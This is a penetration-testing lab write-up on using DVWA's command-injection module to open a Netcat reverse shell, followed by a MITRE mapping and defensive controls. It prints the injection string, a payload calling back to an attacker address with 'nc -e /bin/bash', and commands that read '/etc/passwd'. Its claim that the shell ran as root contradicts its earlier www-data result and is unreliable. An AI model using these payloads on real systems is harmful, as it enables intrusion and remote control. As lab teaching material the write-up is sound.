# Penetration Testing Lab: Reverse Shell via Netcat Using DVWA Command Injection

## Overview

This lab documents the exploitation of a command injection vulnerability in DVWA (Damn Vulnerable Web Application) to establish a reverse shell connection back to the attacker machine using Netcat. The lab demonstrates how a simple input validation failure in a web application can lead to full remote access and system compromise.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Attacker Machine | Kali Linux |
| Target Machine | OWASP Broken Web Applications VM (192.168.100.185) |
| Vulnerable Application | DVWA — Command Injection module |
| Shell Tool | Netcat (nc) |

---

## Vulnerability Background

DVWA's command injection module passes user input directly to the operating system shell without any sanitization. The application is designed to ping an IP address, but by appending a semicolon followed by another command, an attacker can execute arbitrary OS commands alongside the intended ping.

This is a classic **OS Command Injection** vulnerability, one of the most critical web application flaws because it gives an attacker direct interaction with the underlying server.

---

## Exploitation Walkthrough

### Phase 1: Confirming Command Injection

The first step was to verify that the application was vulnerable by injecting a secondary command after the ping input:

```
127.0.0.1; whoami
```

The application responded with `www-data` — confirming that the injected `whoami` command executed successfully on the server. The semicolon caused the shell to treat it as two separate commands: first the ping, then `whoami`.

### Phase 2: Setting Up the Netcat Listener

Before sending the reverse shell payload, a Netcat listener was started on the attacker machine to catch the incoming connection:

```bash
nc -lvnp 4444
```

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS lookup |
| `-p` | Specify port number |

Port 4444 was used as the receiving port for the reverse shell connection.

### Phase 3: Crafting and Injecting the Reverse Shell Payload

The following payload was injected through the DVWA command injection field to initiate a reverse shell back to the attacker machine:

```bash
127.0.0.1; nc -e /bin/bash <attacker-ip> 4444
```

This instructs the target machine to connect back to the attacker's Netcat listener and hand over a bash shell.

### Phase 4: Reverse Shell Established

The Netcat listener caught the incoming connection, providing an interactive shell on the target machine. Running `whoami` confirmed the shell was running as **root** — meaning the web server process had elevated privileges, compounding the severity of the vulnerability.

### Phase 5: Post-Exploitation Validation

With root shell access, the following post-exploitation commands were run to validate the level of access:

```bash
whoami          # Confirm user context
cat /etc/passwd # Enumerate system users
id              # Check user ID and group memberships
```

---

## Why a Reverse Shell is More Dangerous Than Simple Command Execution

A basic command injection allows one command at a time through the web interface. A reverse shell is significantly more powerful because it provides a continuous, interactive terminal session — equivalent to sitting at the target machine locally. From this position an attacker can:

- Navigate the entire filesystem freely
- Escalate privileges if not already root
- Upload malicious files or scripts
- Disable security controls and logging
- Establish persistence for future access
- Move laterally to other systems on the network

---

## MITRE ATT&CK Mapping

| Technique | Tactic | ID |
|-----------|--------|----|
| Exploit Public-Facing Application | Initial Access | T1190 |
| Command and Scripting Interpreter — Unix Shell | Execution | T1059.004 |
| Ingress Tool Transfer | Command & Control | T1105 |
| Remote Access — Reverse Shell | Command & Control | T1219 |

---

## Defensive Controls

**Input Validation:** Sanitize and validate all user input server-side before passing it to any system function. Block dangerous characters such as `;`, `|`, `&&`, and backticks in fields that interact with the OS.

**Principle of Least Privilege:** Web server processes should never run as root. Running as a low-privilege user limits the damage an attacker can do even if command injection is achieved.

**Web Application Firewall (WAF):** A properly configured WAF can detect and block command injection patterns before the payload reaches the application.

---

> **Disclaimer:** This lab was performed on intentionally vulnerable software in a controlled virtual environment for educational purposes only. Unauthorized testing against systems you do not own is illegal.
